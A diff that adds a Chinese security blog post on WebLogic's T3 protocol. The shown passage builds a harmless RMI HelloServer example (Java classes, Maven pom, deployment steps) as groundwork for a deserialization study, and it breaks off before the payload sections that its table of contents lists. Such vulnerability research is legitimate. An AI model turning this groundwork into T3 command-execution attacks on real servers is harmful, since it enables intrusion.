@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x00 前言因为涉及RMI和JNDI的基础知识，推荐先阅读下： RMI JNDI 0x01 什么是T3协议？T3也称为丰富套接字，是BEA内部协议，功能丰富，可扩展性好。T3是多工双向和异步协议，经过高度优化，只使用一个套接字和一条线程。借助这种方法，基于Java的客户端可以根据服务器方需求使用多种RMI对象，但仍使用一个套接字和一条线程。 WebLogic Server 中的 RMI 通信使用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WebLogic系列漏洞学习之T3：T3协议">
+<meta property="og:url" content="http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/index.html">
+<meta property="og:site_name" content="R17a&#39;s blog">
+<meta property="og:description" content="0x00 前言因为涉及RMI和JNDI的基础知识，推荐先阅读下： RMI JNDI 0x01 什么是T3协议？T3也称为丰富套接字，是BEA内部协议，功能丰富，可扩展性好。T3是多工双向和异步协议，经过高度优化，只使用一个套接字和一条线程。借助这种方法，基于Java的客户端可以根据服务器方需求使用多种RMI对象，但仍使用一个套接字和一条线程。 WebLogic Server 中的 RMI 通信使用">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20200721155118447.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20200721155152125.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20200721162706621.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20200721162935046.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20200721163057420.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20200721163206880.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20200721163750014.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20200609170552480.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20200721203221667.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20200721212800433.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20200721214315503.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20200721214719132.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20200721215748210.png">
+<meta property="article:published_time" content="2020-07-20T10:19:23.000Z">
+<meta property="article:modified_time" content="2020-07-20T10:19:23.000Z">
+<meta property="article:author" content="R17a">
+<meta property="article:tag" content="WebLogic">
+<meta property="article:tag" content="T3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/imgs/image-20200721155118447.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>WebLogic系列漏洞学习之T3：T3协议</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/07/22/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9ACVE-2020-2883%E5%92%8CCVE-2020-2555/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&text=WebLogic系列漏洞学习之T3：T3协议" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&title=WebLogic系列漏洞学习之T3：T3协议" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&is_video=false&description=WebLogic系列漏洞学习之T3：T3协议" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WebLogic系列漏洞学习之T3：T3协议&body=Check out this article: http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&title=WebLogic系列漏洞学习之T3：T3协议" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&title=WebLogic系列漏洞学习之T3：T3协议" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&title=WebLogic系列漏洞学习之T3：T3协议" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&title=WebLogic系列漏洞学习之T3：T3协议" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&name=WebLogic系列漏洞学习之T3：T3协议&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BT3%EF%BC%9AT3%E5%8D%8F%E8%AE%AE/&t=WebLogic系列漏洞学习之T3：T3协议" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-什么是T3协议？"><span class="toc-number">2.</span> <span class="toc-text">0x01 什么是T3协议？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-怎么调用T3服务？"><span class="toc-number">3.</span> <span class="toc-text">0x02 怎么调用T3服务？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-WebLogic-T3和反序列化的关系？"><span class="toc-number">4.</span> <span class="toc-text">0x03 WebLogic T3和反序列化的关系？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-怎么构造payload并通过T3执行命令？"><span class="toc-number">5.</span> <span class="toc-text">0x04 怎么构造payload并通过T3执行命令？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析T3包"><span class="toc-number">5.1.</span> <span class="toc-text">分析T3包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造T3包"><span class="toc-number">5.2.</span> <span class="toc-text">构造T3包</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-参考链接："><span class="toc-number">6.</span> <span class="toc-text">0x05 参考链接：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        WebLogic系列漏洞学习之T3：T3协议
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">R17a</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-07-20T10:19:23.000Z" itemprop="datePublished">2020-07-20</time>
+        
+        (Updated: <time datetime="2020-07-20T10:19:23.000Z" itemprop="dateModified">2020-07-20</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a> › <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/WebLogic/">WebLogic</a> › <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/WebLogic/T3/">T3</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/T3/" rel="tag">T3</a>, <a class="tag-link" href="/tags/WebLogic/" rel="tag">WebLogic</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>因为涉及RMI和JNDI的基础知识，推荐先阅读下：</p>
+<p><a href="/2020/06/14/Java%20RMI/">RMI</a></p>
+<p><a href="/2020/06/14/JNDI/">JNDI</a></p>
+<h2 id="0x01-什么是T3协议？"><a href="#0x01-什么是T3协议？" class="headerlink" title="0x01 什么是T3协议？"></a>0x01 什么是T3协议？</h2><p>T3也称为丰富套接字，是BEA内部协议，功能丰富，可扩展性好。T3是多工双向和异步协议，经过高度优化，只使用一个套接字和一条线程。借助这种方法，基于Java的客户端可以根据服务器方需求使用多种RMI对象，但仍使用一个套接字和一条线程。</p>
+<p>WebLogic Server 中的 RMI 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。</p>
+<h2 id="0x02-怎么调用T3服务？"><a href="#0x02-怎么调用T3服务？" class="headerlink" title="0x02 怎么调用T3服务？"></a>0x02 怎么调用T3服务？</h2><p>参考<a href="https://docs.oracle.com/middleware/1213/wls/WLRMI/rmi_imp.htm#WLRMI233" target="_blank" rel="noopener">官方</a>给的例子写个测试例子，该例子将HelloServer服务绑定在jndi上进行管理，方便调用t3的HelloServer服务。</p>
+<p>首先创建Maven项目</p>
+<p><img src="/imgs/image-20200721155118447.png" alt="image-20200721155118447"></p>
+<p>填写信息，选择目录，finish创建完成</p>
+<p><img src="/imgs/image-20200721155152125.png" alt="image-20200721155152125"></p>
+<p>Hello.java：Hello继承Remote接口</p>
+<figure class="highlight java"><figcaption><span>Hello.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Pocs.WebLogic.t3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> java.rmi.RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>HelloImpl.java:实现远程接口Hello，Hello服务的具体信息</p>
+<figure class="highlight java"><figcaption><span>HelloImpl.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Pocs.WebLogic.t3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">implements</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"hello"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Server.java:创建HelloImpl类的实例并在JNDI registry中以HelloServer注册。</p>
+<figure class="highlight java"><figcaption><span>Server.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Pocs.WebLogic.t3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The factory to use when creating our initial context</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String JNDI_FACTORY=<span class="string">"weblogic.jndi.WLInitialContextFactory"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create an instance of the Implementation class</span></span><br><span class="line"><span class="comment">     * and bind it in the registry.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context ctx = getInitialContext(<span class="string">"t3://192.168.116.140:7001"</span>);</span><br><span class="line">            ctx.bind(<span class="string">"HelloServer"</span>, <span class="keyword">new</span> HelloImpl());</span><br><span class="line">            System.out.println(<span class="string">"HelloImpl created and bound to the JNDI"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">"HelloImpl.main: an exception occurred!"</span>);</span><br><span class="line">            e.printStackTrace(System.out);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Creates the Initial JNDI Context */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title">getInitialContext</span><span class="params">(String url)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        env.put(Context.PROVIDER_URL, url);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Client.java：找到HelloServer服务然后去调用</p>
+<figure class="highlight java"><figcaption><span>Client.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Pocs.WebLogic.t3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Defines the JNDI context factory.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String JNDI_FACTORY = <span class="string">"weblogic.jndi.WLInitialContextFactory"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Client</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InitialContext ic = getInitialContext(<span class="string">"t3://192.168.116.140:7001"</span>);</span><br><span class="line">            Hello obj = (Hello) ic.lookup(<span class="string">"HelloServer"</span>);</span><br><span class="line">            System.out.println(<span class="string">"Successfully connected to HelloServer , call sayHello() : "</span>+ obj.sayHello());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            System.err.println(<span class="string">"An exception occurred: "</span> + ex.getMessage());</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title">getInitialContext</span><span class="params">(String url)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> Hashtable&lt;String, String&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        env.put(Context.PROVIDER_URL, url);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改pom.xml：</p>
+<figure class="highlight xml"><figcaption><span>pom.xml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>Pocs.WebLogic.t3<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>t3<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">addClasspath</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addClasspath</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">useUniqueVersions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">useUniqueVersions</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">classpathPrefix</span>&gt;</span>lib/<span class="tag">&lt;/<span class="name">classpathPrefix</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>Pocs.WebLogic.t3.Server<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>mvn package生成jar包，将jar包放在域的lib下</p>
+<p><img src="/imgs/image-20200721162706621.png" alt="image-20200721162706621"></p>
+<p>然后在WebLogic console下新增一个启动类，类名要写全名，选择adminserver</p>
+<p><img src="/imgs/image-20200721162935046.png" alt="image-20200721162935046"></p>
+<p>重启weblogic（可以先不重启看下有没有，我忘了到底重启没）找到JNDI</p>
+<p><img src="/imgs/image-20200721163057420.png" alt="image-20200721163057420"></p>
+<p>可以看到AdminServer下多了HelloServer，这时候证明HelloServer在Weblogic的JNDI注册成功</p>
+<p><img src="/imgs/image-20200721163206880.png" alt="image-20200721163206880"></p>
+<p>这时可以执行Client.java，客户端成功调用HelloServer服务。如果报错的话，提示没有WLInitialContextFactory类，因为客户端调用了weblogic.jndi.WLInitialContextFactory，所以要加下weblogic的jar，可以把weblogic的wlserver/server/lib下的jar包拷贝出来放到一个目录然后加到Libraries下，我用的是之前某次远程分析时候的jar，版本是10.3.6。</p>
